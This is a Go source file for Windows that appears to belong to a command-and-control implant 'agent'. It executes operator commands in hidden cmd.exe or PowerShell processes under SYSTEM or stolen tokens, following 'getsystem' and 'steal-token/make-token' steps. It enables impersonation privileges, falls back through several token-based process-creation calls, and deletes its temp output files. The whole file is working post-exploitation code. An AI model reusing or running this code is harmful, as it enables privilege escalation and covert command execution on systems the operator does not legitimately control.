//go:build windows

package agent

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	procCreateProcessWithTokenW2 = windows.NewLazySystemDLL("advapi32.dll").NewProc("CreateProcessWithTokenW")
	procCreateProcessAsUserW2    = windows.NewLazySystemDLL("advapi32.dll").NewProc("CreateProcessAsUserW")
	procDeleteFileA2             = windows.NewLazySystemDLL("kernel32.dll").NewProc("DeleteFileA")
)

func winErrno(err error) uint32 {
	if errno, ok := err.(syscall.Errno); ok {
		return uint32(errno)
	}
	return 0
}

func makeShellCmd(cmd string) *exec.Cmd {
	c := exec.Command("cmd.exe")
	c.SysProcAttr = &windows.SysProcAttr{
		CmdLine:    `/S /C "` + cmd + `"`,
		HideWindow: true,
	}
	return c
}

// makeInteractiveShellCmd keeps the interactive shell on the SYSTEM token
// after getsystem.  os/exec propagates its stdin/stdout/stderr pipes while the
// token is supplied through the Windows STARTUPINFO process attributes.
func makeInteractiveShellCmd(shell string) *exec.Cmd {
	var c *exec.Cmd
	if shell == "ps" || shell == "powershell" {
		c = exec.Command("powershell.exe", "-NoLogo", "-NoProfile", "-NonInteractive")
	} else {
		c = exec.Command("cmd.exe", "/Q")
	}
	if gSystemToken != 0 {
		c.SysProcAttr = &windows.SysProcAttr{
			Token:      syscall.Token(gSystemToken),
			HideWindow: true,
		}
	} else {
		c.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	}
	return c
}

// shellDirect runs a shell command via cmd.exe and captures output to a temp file.
// Unlike exec.Cmd with Stdout pipes, this approach prevents grandchild processes
// started with 'start /b' from inheriting the pipe write handle, which would cause
// the goroutine reading from the pipe to block indefinitely until the grandchild exits.
func shellDirect(cmd string) string {
	uid := fmt.Sprintf("%08x%016x", os.Getpid(), time.Now().UnixNano())
	tmpDir := os.TempDir()
	if len(tmpDir) > 0 && tmpDir[len(tmpDir)-1] != '\\' {
		tmpDir += `\`
	}
	outPath := tmpDir + "sbo" + uid + ".tmp"

	c := exec.Command("cmd.exe")
	c.SysProcAttr = &windows.SysProcAttr{
		CmdLine:    `/d /c ` + cmd + ` > "` + outPath + `" 2>&1`,
		HideWindow: true,
	}
	// No Stdout/Stderr set — cmd.exe writes directly to the temp file.
	// This prevents any grandchild processes from inheriting our pipe handles.

	if err := c.Start(); err != nil {
		_ = os.Remove(outPath)
		return fmt.Sprintf("[error: shell: %v]", err)
	}
	done := make(chan error, 1)
	go func() { done <- c.Wait() }()
	select {
	case <-done:
	case <-time.After(60 * time.Second):
		c.Process.Kill()
		<-done
	}
	data, _ := os.ReadFile(outPath)
	_ = os.Remove(outPath)
	return string(data)
}

// runShellSystemHook runs cmd using temp-file redirection on Windows, optionally
// via the stored SYSTEM or stolen token. Using temp files instead of pipes avoids
// handle inheritance into grandchild processes (e.g. 'start /b agent.exe').
func runShellSystemHook(cmd string) (out string, handled bool, err error) {
	if gSystemToken != 0 {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		return shellDirectAsSystem(cmd, windows.Handle(gSystemToken)), true, nil
	}
	// When steal-token/make-token is active, use CreateProcessWithTokenW so the
	// child process runs under the stolen identity (not the process primary token).
	if stolenToken != 0 {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		return shellDirectAsSystem(cmd, windows.Handle(stolenToken)), true, nil
	}
	// Non-elevated case: always use temp-file approach on Windows to avoid
	// pipe handle inheritance into background processes.
	return shellDirect(cmd), true, nil
}

// shellDirectAsSystem creates a cmd.exe process using the supplied primary token
// via raw Win32 calls, capturing stdout+stderr via command-line redirection to
// a temp file.  Using STARTF_USESTDHANDLES with CreateProcessWithTokenW causes
// STATUS_DLL_INIT_FAILED because seclogon cannot duplicate pipe handles across
// session boundaries.
func shellDirectAsSystem(cmd string, token windows.Handle) string {
	tick, _, _ := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetTickCount").Call()
	uid := fmt.Sprintf("%016x", uint64(os.Getpid())^uint64(tick))
	outPath := `C:\Windows\Temp\sbo` + uid + `.tmp`
	shellArgs := `/d /c ` + cmd + ` > "` + outPath + `" 2>&1`
	wargs, _ := syscall.UTF16PtrFromString(shellArgs)
	wargsAsUser, _ := syscall.UTF16PtrFromString(shellArgs)

	_ = enablePrivilege("SeImpersonatePrivilege")
	_ = enablePrivilege("SeIncreaseQuotaPrivilege")
	_ = enablePrivilege("SeAssignPrimaryTokenPrivilege")
	_ = enableTokenPrivilege(token, "SeImpersonatePrivilege")
	_ = enableTokenPrivilege(token, "SeIncreaseQuotaPrivilege")
	_ = enableTokenPrivilege(token, "SeAssignPrimaryTokenPrivilege")

	// No STARTF_USESTDHANDLES — the child writes its own output file.
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = 0 // SW_HIDE

	var pi windows.ProcessInformation
	cmdApp, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\cmd.exe`)
	cmdCwd, _ := syscall.UTF16PtrFromString(`C:\Windows\System32`)
	var withTokenErr, asUserErr, impersonateErr uint32
	var r uintptr
	r, _, e := procCreateProcessWithTokenW2.Call(
		uintptr(token), 0,
		uintptr(unsafe.Pointer(cmdApp)),
		uintptr(unsafe.Pointer(wargs)),
		0x08000000, 0, uintptr(unsafe.Pointer(cmdCwd)),
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		withTokenErr = winErrno(e)
		r, _, e = procCreateProcessAsUserW2.Call(
			uintptr(token),
			uintptr(unsafe.Pointer(cmdApp)),
			uintptr(unsafe.Pointer(wargsAsUser)),
			0, 0, 0, 0x08000000, 0,
			uintptr(unsafe.Pointer(cmdCwd)),
			uintptr(unsafe.Pointer(&si)),
			uintptr(unsafe.Pointer(&pi)),
		)
		if r == 0 {
			asUserErr = winErrno(e)
		}
	}
	if r == 0 {
		if ir, _, ie := procImpersonateLoggedOnUser.Call(uintptr(token)); ir == 0 {
			impersonateErr = winErrno(ie)
		} else {
			wargsRetry, _ := syscall.UTF16PtrFromString(shellArgs)
			r, _, e = procCreateProcessWithTokenW2.Call(
				uintptr(token), 0, uintptr(unsafe.Pointer(cmdApp)),
				uintptr(unsafe.Pointer(wargsRetry)), 0x08000000, 0,
				uintptr(unsafe.Pointer(cmdCwd)), uintptr(unsafe.Pointer(&si)),
				uintptr(unsafe.Pointer(&pi)))
			if r == 0 {
				withTokenErr = winErrno(e)
			}
			_, _, _ = procRevertToSelf2.Call()
		}
	}
	if r == 0 {
		return fmt.Sprintf("[error: SYSTEM shell launch; WithToken=%d; AsUser=%d; Impersonate=%d]",
			withTokenErr, asUserErr, impersonateErr)
	}

	_, _ = windows.WaitForSingleObject(pi.Process, 60000)
	_ = windows.CloseHandle(pi.Process)
	_ = windows.CloseHandle(pi.Thread)

	data, err := os.ReadFile(outPath)
	outPathA, _ := syscall.BytePtrFromString(outPath)
	_, _, _ = procDeleteFileA2.Call(uintptr(unsafe.Pointer(outPathA)))
	if err != nil || len(data) == 0 {
		return fmt.Sprintf("[error: SYSTEM shell capture empty; WithToken=%d; AsUser=%d]",
			withTokenErr, asUserErr)
	}
	return string(data)
}

// enableTokenPrivilege adjusts a privilege on a duplicated primary token.
// The caller may not have every privilege in a filtered token, so failures
// are intentionally returned to the caller and handled as launch diagnostics.
func enableTokenPrivilege(token windows.Handle, name string) error {
	privName, _ := syscall.UTF16PtrFromString(name)
	var luid windows.LUID
	r, _, e := procLookupPrivilegeValueW.Call(0, uintptr(unsafe.Pointer(privName)), uintptr(unsafe.Pointer(&luid)))
	if r == 0 {
		return e
	}
	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED}},
	}
	r, _, e = procAdjustTokenPrivileges.Call(uintptr(token), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
	if r == 0 {
		return e
	}
	if errno, ok := e.(syscall.Errno); ok && errno == 1300 {
		return fmt.Errorf("privilege not held by token")
	}
	return nil
}
